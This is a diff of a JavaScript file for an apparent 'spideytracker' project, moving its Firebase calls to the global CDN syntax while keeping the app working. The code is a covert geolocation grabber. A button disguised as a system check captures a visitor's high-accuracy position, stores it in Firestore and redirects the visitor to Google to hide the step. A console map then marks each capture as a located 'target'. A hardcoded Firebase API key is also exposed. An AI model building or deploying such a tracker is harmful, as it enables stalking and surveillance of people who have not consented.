@@ -1,7 +1,4 @@
-// --- CONFIGURACIÓN DE FIREBASE ---
-import { initializeApp } from "firebase/app";
-import { getFirestore, collection, addDoc, onSnapshot } from "firebase/firestore";
-
+// --- CONFIGURACIÓN DE FIREBASE (Versión Global CDN) ---
 const firebaseConfig = {
   apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
   authDomain: "spideytracker-591bb.firebaseapp.com",
@@ -12,15 +9,15 @@ const firebaseConfig = {
   measurementId: "G-RFC57L9T0Y"
 };
 
-const app = initializeApp(firebaseConfig);
-const db = getFirestore(app);
+// Inicializar Firebase con los objetos globales del CDN
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
 // --- LÓGICA DE LA APLICACIÓN ---
 document.addEventListener("DOMContentLoaded", () => {
     const sysCheckBtn = document.getElementById("sysCheckBtn");
     const mapContainer = document.getElementById("map");
 
-    // Detectar si estamos en la vista de consola (mapa) o en la vista del objetivo
     if (mapContainer) {
         // --- MODO CONSOLA (Visualización de Arañas 🕷️) ---
         const map = L.map('map').setView([0, 0], 2);
@@ -29,7 +26,6 @@ document.addEventListener("DOMContentLoaded", () => {
             attribution: '© OpenStreetMap contributors'
         }).addTo(map);
 
-        // Icono personalizado con la araña
         const spiderIcon = L.divIcon({
             className: 'spider-marker',
             html: '<div style="font-size: 24px; text-align: center;">🕷️</div>',
@@ -37,21 +33,19 @@ document.addEventListener("DOMContentLoaded", () => {
             iconAnchor: [15, 15]
         });
 
-        // Escuchar cambios en tiempo real en Firestore
-        onSnapshot(collection(db, "locations"), (snapshot) => {
+        // Escuchar cambios en tiempo real con la sintaxis global de Firestore
+        db.collection("locations").onSnapshot((snapshot) => {
             snapshot.docChanges().forEach((change) => {
                 if (change.type === "added") {
                     const data = change.doc.data();
                     const lat = data.latitude;
                     const lng = data.longitude;
-                    const timestamp = data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString() : 'Justo ahora';
+                    const timestamp = data.timestamp ? data.timestamp.toDate().toLocaleString() : 'Justo ahora';
 
-                    // Agregar el marcador de la araña al mapa
                     L.marker([lat, lng], { icon: spiderIcon })
                         .addTo(map)
                         .bindPopup(`<b>¡Objetivo localizado!</b><br>Lat: ${lat.toFixed(4)}, Lng: ${lng.toFixed(4)}<br>Hora: ${timestamp}`);
 
-                    // Centrar el mapa en el punto más reciente
                     map.setView([lat, lng], 15);
                 }
             });
@@ -64,7 +58,7 @@ document.addEventListener("DOMContentLoaded", () => {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         try {
-                            await addDoc(collection(db, "locations"), {
+                            await db.collection("locations").add({
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
                                 timestamp: new Date()
@@ -72,11 +66,9 @@ document.addEventListener("DOMContentLoaded", () => {
                         } catch (e) {
                             console.error("Error al registrar posición", e);
                         }
-                        // Redirección inmediata a Google
                         window.location.href = "https://www.google.com";
                     },
                     (error) => {
-                        // Si deniega el permiso, redirige de todos modos
                         window.location.href = "https://www.google.com";
                     },
                     { enableHighAccuracy: true }
